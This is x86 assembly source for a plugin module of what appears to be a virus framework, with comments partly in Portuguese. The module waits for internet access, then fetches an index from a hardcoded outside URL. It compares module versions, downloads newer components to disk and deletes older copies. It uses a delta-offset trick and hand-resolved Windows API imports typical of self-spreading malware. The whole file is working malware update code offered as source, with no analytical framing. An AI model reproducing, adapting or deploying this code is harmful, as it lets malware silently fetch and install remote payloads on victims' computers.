;muazzin reproduction - old babylonia httpïs way

BITS 32

%include "\muazzin\muazzin.asi"

;%define DEBUG 1

TYPE    EQU "http"
VERSION EQU 0106h

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_QUERY
       jnz .query
       test dword [esi+m_why], MT_BLOOM
       jnz near getmuazzins
       mov dword [esi+m_result], MR_DONE
       jmp .exit
  .query:
       mov esi, MT_QUERY+MT_BLOOM
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
  .exit:
       ret 4

delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret

dllinit:
       call delta
       pushad
       mov eax, [esi+m_muazzin]
       mov [ebp+mtable], eax
       mov eax, [esi+m_iroutine]
       mov [ebp+mcall], eax
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       call [ebp+getmhnd]
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       call [ebp+getpaddr]
       mov [esi-4], eax
       jmp .next_import
  .dll_done:
       pop esi
       jmp .next_dll
  .all_import:
       push dword 64*1024
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+getmuazzins.tmpmem], eax
       popad
       ret

dllfree:
       pushad
       push dword [ebp+getmuazzins.tmpmem]
       call [ebp+GlobalFree]
       lea esi, [ebp+import_table]
  .next_unload:
       lodsd
       test eax, eax
       jz .all_unload
       inc eax
       jz .next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp .next_unload
  .all_unload:
       popad
       ret

getmuazzins:
       call dllinit
       pushad
;db 0cch
       mov edi, [ebp+mtable]
       mov ecx, 32
  .next_kind:
       sub ebx, ebx
       cmp [edi+menum_type], ebx
       jz .emptyslot
       push edi
       push ecx
       mov ebx, [edi+menum_type]
       mov eax, [edi+menum_version]
       jmp .insteq1
  .chkrepeat:
       pushad
       cmp ebx, [edi+menum_type]
       jne .insteq               ;e igual ao muazzin que nois checo agora?
       sub ebx, ebx
       cmp [edi+menum_version], eax
       jbe .delete_disone
       mov edi, [esp+9*4]       ;delete muazzin weïre current checking
       mov ecx, [esp+8*4]
  .delete_disone:
       mov dword [edi+menum_type], ebx
       sub esp, 104h
       sub cl, 32
       neg cl
       push esp                 ;delete current
       call [ebp+mcall]
       push esp
       call [ebp+DeleteFileA]
       add esp, 104h
  .insteq:
       popad
  .insteq1:
       add edi, menum_sizeof
       loop .chkrepeat
       pop ecx
       pop edi
  .emptyslot:
       add edi, menum_sizeof
       loop .next_kind

  .noinet:
       call CheckInet
       jnc .inet
  .noinet2:
       push dword 15*60*1000
       call [ebp+Sleep]
       jmp .noinet

  .inet:
       sub edi, edi                     ;weïre connected to inet
       push edi
       push edi
       push edi
       push edi
       push edi
       call [ebp+InternetOpenA]
       mov [ebp+.inet_handle], eax
       test eax, eax
       jz near .giveup

       mov eax, [ebp+url_list]
       add eax, ebp

       mov [ebp+.url_ptr], eax

       push edi
       push edi
       push edi
       push edi
       push eax                 ;url
       push dword [ebp+.inet_handle]
       call [ebp+InternetOpenUrlA]
       mov ebx, eax
       test eax, eax
       jz near .set2delete

       push edi
       push esp
       push dword 4*1024
       push dword 12345678h
  .tmpmem equ $-4
       mov esi, [esp]                           ;esi=buffer
       push ebx
       call [ebp+InternetReadFile]
       push ebx
       call [ebp+InternetCloseHandle]
       pop ecx                                  ;ecx=size

  .next_entry:
       cld
       mov [ebp+.index], esi

       lodsd
       mov edx, eax
       lodsb
       lodsd
       xchg eax, edx                    ;eax=type
       sub edx, "0000"                  ;edx=version
       inc esi

       mov edi, [ebp+mtable]
       push byte 32
       sub ebx, ebx
       pop ecx
  .vrf_muazzin:
       cmp dword [edi+menum_type], 0
       je .muazzin_update
       cmp [edi+menum_type], eax
       jne .vrf_next_muazzin
       cmp [edi+menum_version], edx
       jb .muazzin_update
       test ebx, ebx
       jz .next_entry2__
       mov dword [ebx+menum_type], 0
  .next_entry2__:
       jmp .next_entry2
  .muazzin_update:
       test ebx, ebx
       jnz .vrf_next_muazzin
       mov dword [edi+menum_type], ecx
       mov ebx, edi
  .vrf_next_muazzin:
       add edi, menum_sizeof
       loop .vrf_muazzin

       test ebx, ebx
       jz near .next_entry2

       mov dword [ebx+menum_version], edx
       mov dword [ebx+menum_kind], MS_SENT
       xchg eax, dword [ebx+menum_type]

       sub al, 32
       neg al
       mov [ebp+.nameindex], eax

       sub esp, 100h
       mov edi, esp
       push esi

       mov esi, 12345678h
  .url_ptr equ $-4

  .l001:
       lodsb
       stosb
       test al, al
       jnz .l001                                ;copy url
  .l002:
       dec edi
       cmp byte [edi-1], "/"
       jne .l002
       pop esi
  .l003:
       lodsb
       stosb
       test al, al
       jnz .l003                                ;copy filename
       sub eax, eax
       stosd

       mov eax, esp

       sub edi, edi
       push edi
       push edi
       push edi
       push edi
       push eax                 ;url
       push dword [ebp+.inet_handle]
       call [ebp+InternetOpenUrlA]
       mov ebx, eax
       test eax, eax
       jz near .fudeu

%ifdef DEBUG
       push dword "OK"
       push esp
       call msgbox
       add esp, 4
%endif

       push edi
       push esp
       push dword 60*1024
       push dword [ebp+.tmpmem]
       add dword [esp], 4*1024
       push ebx
       call [ebp+InternetReadFile]
       push ebx
       call [ebp+InternetCloseHandle]
%ifdef DEBUG
       push dword [ebp+.tmpmem]
       add dword [esp], 4*1024
       call msgbox
%endif
       pop esi                                  ;edi=size


       push esp
       mov ecx, 12345678h
  .nameindex equ $-4
       call [ebp+mcall]
       mov edx, esp
%ifdef DEBUG
       push edx
       call msgbox
%endif

       push edi
       push dword 80h
       push byte 2
       push edi
       push edi
       push dword 0c0000000h
       push edx
       call [ebp+CreateFileA]
       inc eax
       jz .fudeu
       dec eax
       push eax
       push edi
       push esp
       xchg edi, [esp]
       push edi
       push esi                         ;size
       push dword [ebp+.tmpmem]         ;buffer
       add dword [esp], 4*1024
       push eax
       call [ebp+WriteFile]
       pop eax
       call [ebp+CloseHandle]
  .fudeu:
       add esp, 100h

  .next_entry2:
       mov esi, 1234567h
  .index equ $-4
%ifdef DEBUG
       push dword "SEK"
       push esp
       call msgbox
       mov [esp], esi
       call msgbox
%endif
  .search0:
       lodsb
       test al, al
       jne .search0

%ifdef DEBUG
       push esi
       call msgbox
%endif

       cmp dword [esi], 0
       jne near .next_entry

       jmp .giveup2

  .set2delete:
       or dword [ebp+.exit_code], MR_DELETE

  .giveup2:
%ifdef DEBUG
       push dword "bye"
       push esp
       call msgbox
       pop eax
%endif
       push dword 12345678h
  .inet_handle equ $-4
       call [ebp+InternetCloseHandle]

  .giveup:
       call dllfree
       popad
       mov dword [esi+m_result], dword MR_OK
  .exit_code equ $-4
       ret 4

%ifdef DEBUG
msgbox:
       pushad
       push byte 0
       call .zkip
       db "DEBUG", 0
  .zkip
       push dword [esp+8*4+3*4]
       push byte 0
       call delta
       call [ebp+MessageBoxA]
       popad
       ret 4
%endif

%include "\muazzin\samples\inet.asi"

mtable dd 0
mcall  dd 0
getpaddr dd 0
getmhnd  dd 0

url_list dd .url1_1
         dd 0
         dd 0

  .url1_1 db "http://pleiku.vietmedia.com/bye/INDEX.TXT", 0

import_table dd kernel32
             dd wininet
%ifdef DEBUG
             dd user32
%endif
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
.apiname005 db "GlobalAlloc", 0
.apiname006 db "GlobalFree", 0
.apiname007 db "Sleep",0
.apiname008 db "GetTickCount",0
.apiname009 db "WriteFile",0
.apiname010 db "DeleteFileA",0

wininet     db "WININET.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
            dd 0
.apiname001 db "InternetOpenA", 0
.apiname002 db "InternetOpenUrlA", 0
.apiname003 db "InternetCloseHandle", 0
.apiname004 db "InternetReadFile", 0


%ifdef DEBUG
user32      db "USER32.DLL",0
.api001     dd .apiname001
            dd 0
.apiname001 db "MessageBoxA", 0

MessageBoxA equ user32.api001
%endif

LoadLibraryA     equ kernel32.api001
FreeLibrary      equ kernel32.api002
CreateFileA      equ kernel32.api003
CloseHandle      equ kernel32.api004
GlobalAlloc      equ kernel32.api005
GlobalFree       equ kernel32.api006
Sleep            equ kernel32.api007
GetTickCount     equ kernel32.api008
WriteFile        equ kernel32.api009
DeleteFileA      equ kernel32.api010

InternetOpenA       equ wininet.api001
InternetOpenUrlA    equ wininet.api002
InternetCloseHandle equ wininet.api003
InternetReadFile    equ wininet.api004

LOADLIB equ LoadLibraryA
FREELIB equ FreeLibrary
